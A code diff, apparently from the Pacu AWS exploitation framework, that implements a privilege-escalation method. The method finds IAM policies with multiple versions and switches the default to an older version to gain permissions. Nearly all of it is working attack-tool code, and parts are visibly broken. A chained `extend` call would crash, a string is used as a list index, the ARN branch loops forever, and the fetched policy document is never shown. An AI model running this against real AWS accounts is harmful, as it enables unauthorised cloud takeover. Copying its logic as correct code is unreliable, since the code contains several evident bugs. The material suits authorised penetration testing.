@@ -545,6 +545,8 @@ def CreateNewPolicyVersion(pacu_main, print, input, fetch_data):
                     if 'PolicyArn' in policy and 'arn:aws:iam::aws' not in policy['PolicyArn']:
                         valid_group_policies.append(deepcopy(policy))
 
+            print('      {} valid group-attached policy(ies) found.\n'.format(len(valid_group_policies)))
+
             if len(valid_group_policies) > 1:
                 for i in range(0, len(valid_group_policies)):
                     print('        [{}] {}'.format(i, valid_group_policies[i]['PolicyName']))
@@ -608,7 +610,128 @@ def CreateNewPolicyVersion(pacu_main, print, input, fetch_data):
 
 
 def SetExistingDefaultPolicyVersion(pacu_main, print, input, fetch_data):
-    return
+    session = pacu_main.get_active_session()
+
+    print('  Starting method SetExistingDefaultPolicyVersion...\n')
+    client = pacu_main.get_boto3_client('iam')
+
+    policy_arn = input('    Is there a specific policy you want to target? Enter its ARN now (just hit enter to automatically figure out a list of valid policies to check): ')
+
+    target_policy = {}
+    all_potential_policies = []
+    potential_user_policies = []
+    potential_group_policies = []
+
+    if not policy_arn:
+        print('    No policy ARN entered, now finding a valid policy...\n')
+
+        active_aws_key = session.get_active_aws_key(pacu_main.database)
+
+        if active_aws_key.policies:
+            all_user_policies = active_aws_key.policies
+
+            for policy in all_user_policies:
+                if 'PolicyArn' in policy.keys() and 'arn:aws:iam::aws' not in policy['PolicyArn']:
+                    potential_user_policies.append(deepcopy(policy))
+
+        # If no valid user-attached policies found, try groups
+        if active_aws_key.groups:
+            groups = active_aws_key.groups
+
+            for group in groups:
+                for policy in group['Policies']:
+                    if 'PolicyArn' in policy and 'arn:aws:iam::aws' not in policy['PolicyArn']:
+                        potential_group_policies.append(deepcopy(policy))
+
+        # If it looks like permissions haven't been/attempted to be enumerated
+        if not policy_arn and active_aws_key.allow_permissions == {}:
+            fetch = input('    It looks like the current users confirmed permissions have not been enumerated yet, so no valid policy can be found, enter "y" to run the confirm_permissions module to enumerate the required information, enter the ARN of a policy to create a new version for, or "n" to skip this privilege escalation module ([policy_arn]/y/n): ')
+            if fetch.strip().lower() == 'n':
+                print('    Cancelling SetExistingDefaultPolicyVersion...')
+                return False
+
+            elif fetch.strip().lower() == 'y':
+                if fetch_data(None, 'confirm_permissions', '', force=True) is False:
+                    print('Pre-req module not run successfully. Skipping method...')
+                    return False
+                return SetExistingDefaultPolicyVersion(pacu_main, print, input, fetch_data)
+
+            else:  # It is an ARN
+                policy_arn = fetch
+
+    if not policy_arn:  # If no policy_arn yet, check potential group and user policies
+        policies_with_versions = []
+        all_potential_policies.extend(potential_user_policies).extend(potential_group_policies)
+        for policy in all_potential_policies:
+            response = client.list_policy_versions(
+                PolicyArn=policy['PolicyArn']
+            )
+            versions = response['Versions']
+            while response['IsTruncated']:
+                response = client.list_policy_versions(
+                    PolicyArn=policy['PolicyArn'],
+                    Marker=response['Marker']
+                )
+                versions.extend(response['Versions'])
+            if len(versions) > 1:
+                policy['Versions'] = versions
+                policies_with_versions.append(policy)
+        if len(policies_with_versions) > 1:
+            print('Found {} policy(ies) with multiple versions. Choose one below.'.format(len(policies_with_versions)))
+            for i in range(0, len(policies_with_versions)):
+                print('  [{}] {}: {} versions'.format(i, policies_with_versions[i]['PolicyName'], len(policies_with_versions[i]['Versions'])))
+            choice = input('Choose an option: ')
+            target_policy = policies_with_versions[choice]
+        elif len(policies_with_versions) == 1:
+            target_policy = policies_with_versions[0]
+    else:
+        while policy_arn:  # Run until we get a policy with multiple versions or they cancel
+            response = client.list_policy_versions(
+                PolicyArn=policy_arn
+            )
+            versions = response['Versions']
+            while response['IsTruncated']:
+                response = client.list_policy_versions(
+                    PolicyArn=policy_arn,
+                    Marker=response['Marker']
+                )
+                versions.extend(response['Versions'])
+            if len(versions) == 1:
+                policy_arn = input('  The policy ARN you supplied only has one valid version. Enter another policy ARN to try again, or press enter to skip to the next privilege escalation method: ')
+                if not policy_arn:
+                    return False
+
+    if not target_policy:  # If even after everything else, there is still no policy: exit
+        print('  All methods of enumerating a valid policy have failed. Skipping to the next privilege escalation method...')
+        return False
+    
+    print('Now printing the policy document for each version of the target policy...\n')
+    for version in target_policy['Versions']:
+        version_document = client.get_policy_version(
+            PolicyArn=target_policy['PolicyArn'],
+            VersionId=version['VersionId']
+        )['PolicyVersion']['Document']
+        if version['IsDefaultVersion'] is True:
+            print('Version (default): {}\n'.format(version['VersionId']))
+        else:
+            print('Version: {}\n'.format(version['VersionId']))
+
+        print(version)
+    new_version = input('What version would you like to switch to (example: v1)? Just press enter to keep it as the default: ')
+    if not new_version:
+        print('  Keeping the default version as is.')
+        return False
+
+    try:
+        client.set_default_policy_version(
+            PolicyArn=target_policy['PolicyArn'],
+            VersionId=new_version
+        )
+        print('  Successfully set the default policy version to {}!'.format(new_version))
+        return True
+    except Exception as error:
+        print('  Failed to set a new default policy version: {}'.format(error))
+        return False
 
 
 def CreateEC2WithExistingIP(pacu_main, print, input, fetch_data):
